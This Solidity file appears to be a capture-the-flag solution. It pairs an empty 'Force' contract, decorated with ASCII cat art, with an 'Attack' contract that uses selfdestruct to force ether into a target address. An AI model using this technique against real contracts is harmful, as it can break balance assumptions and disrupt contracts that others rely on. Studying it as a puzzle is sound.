// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attack {
    constructor() payable {}

    function attack(address payable _address) external {
        selfdestruct(_address);
    }
}